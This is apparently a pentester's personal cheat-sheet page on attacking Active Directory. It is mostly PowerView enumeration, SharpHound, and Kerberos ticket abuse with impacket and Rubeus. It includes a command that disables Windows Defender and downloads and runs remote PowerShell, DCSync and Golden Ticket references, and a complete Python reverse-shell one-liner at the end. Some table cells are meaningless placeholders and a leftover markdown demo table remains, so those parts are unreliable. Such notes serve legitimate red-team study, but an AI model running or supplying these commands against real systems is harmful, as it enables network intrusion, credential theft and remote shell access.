---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# INFASTRUCTURE


# ACTIVE DIRECTORY


## DOMAIN ENUMERATION

I do prefer to do manual enumeration but on large enterprice networks, some automated scan would come in handy to search for low hanging fruits

Automated Scanners
AdPeas.ps1

You can aswell use BloodHound to visualize data

> checklist
check password policy
gather usernam -
Pray and Spray with CME 

```powershell
#For SharpHound.exe
./SharpHound.exe --CollectionMethod All

#For SharpHound.ps1
Invoke-BloodHound -ZipFileName ratloot -CollectionMethod All -Domain  rat.local

```
<span class="demo-highlight"># Patch AMSI or disable AV</span>

Getting hands dirty with PowerView
```powershell
      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
```
 <br>
 <span class="demo-highlight"># Domain & Controller Enumeration</span>

```powershell
Get-NetDomain 
            
Get-NetDomainController     
```
<br>
 <span class="demo-highlight"># User Enumeration</span>

```powershell
# Get all users present in the domain
Get-NetUsers | select cn

# Get users sorted with most logoncounts
Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending

# Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying
Get-NetUsers | select samaccountname > username.txt

```
<br>
<span class="demo-highlight"># Group Enumeration </span>

```powershell
# Get AD groups data either all or of a user
Get-NetGroup [-Domain <target>] [-FullData] [-GroupName "*admin*"] [-Username 'user_name']

# Get Members of a group
Get-NetGroupMember [-GroupName 'group_name'] [-Recurse]	
```
<br>
<span class="demo-highlight"># Share Enumeration</span>

```powershell
# Find interesting shares
Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint	

```
<br>
<span class="demo-highlight"># GPO Enumeration</span>

```powershell
# List all GPOs in the domain
Get-NetGPO [-ComputerName <rat.domain>]	

#Find Interesting GPO
Get-NetGPOGroup

```
<br>
<span class="demo-highlight"># OU Enumeration</span>

```powershell
# Get all OU (Organisational Units) in the domain
Get-NetOU [-FullData]

# Get gplink of an OU to get GPOs applied to it
(Get-NetOU -Name 'test').gplink	

# Get GPO of a GPlink
Get-NetGPO -GPOName '{cadkfapsdfasdfaudvajkd}'

# Get GPO of an OU using gplink
((Get-NetOU -FullData <OU_NAME>).gplink -split "cn=" -split ",")[1] | Get-NetGPO
```
<br>
<span class="demo-highlight"># ACL Enumeration</span>

```powershell
# Find interesting ACL
Invoke-ACLScanner -ResolveGUIDS	

# Find interesting ACL owned by a certain user :rat:
Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match 'rat'}	
```
<br>
<span class="demo-highlight"># Trust Enumeration</span>

```powershell
# Map all domain trust
Get-NetDomainTrust [-Domain <target>]

# Get all the domain of a forest
Get-NetForestDomain [-Forest <target>]	
```
<br>
<span class="demo-highlight"># Hunting Users and Sessions</span>

```powershell
# Get list of all machines where current user has local admin access
Find-LocalAdminAccess	

# Invoke-EnumerateLocalAdmin	
Find all admins on all computers

# Find machines where a domain admin has a session, checkaccess tells you if you also have access to that machine
Invoke-UserHunter [-GroupName <group_name>] [-CheckAccess]	

# Get list of active sessions on a computer
Get-NetSession [-ComputerName <comp_name>]	

# Get list of Users logged-on on a system
Get-LoggedOnLocal [-ComputerName <comp_name>]	
```

<br>
## Kerberos Attacks
<br>
<span class="demo-highlight"># working from linux with creds</span>


````powershell
# username : rat
# password : r@tty419
# domain : rodent.local
impacket-getTGT rodent.local/rat:'r@tty419'


# now import the ticket into memory
export KRB5CCNAME=/tmp/rat.ccache

# confirm the ticket in memory 
klist
````
<br>
<br>
<span class="demo-highlight"># working from windows with creds</span>
````powershell
# Using Rubeus

./Rubeus.exe asktgt 
````

<br>
using */altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm* in Rubeus you can ask for all the tickets
<br>
| Service Ticket   | Service Type | # Abuse funtino |
|--------------|:-----:|-----------:|
| CIFS         |Windows FileShare, PsExec |        739 |
| HOST         |PsRemoting, Scheduled Task | adcad |
| HTTP         |PsRemoting|$sess = New-PsSession -Computername DC01; Enter-PsSession -Session $sess |
| LDAP         |LDAP Ops, DCSync |Mimikatz > lsadump::dcsync /rat.local:$DC-IP /all /csv |
| RPCSS        |  1.99 |        739 |
| KRBTGT       |Golden Ticket |do anything lol,|
| HOST & RPCSS |WMI |  WMIEXEC|
| HOST & HTTP |WinRM |  WMIEXEC|



|                |ASCII                          |HTML                         |
|----------------|-------------------------------|-----------------------------|
|Single backticks|`'Isn't this fun?'`            |'Isn't this fun?'            |
|Quotes          |`"Isn't this fun?"`            |"Isn't this fun?"            |
|Dashes          |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash|
<br>


## RTF && SCF Weaponization

<br>
<br>
<br>

# MITM6 IPV6 Attack

<br>
<br>
<br>




```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
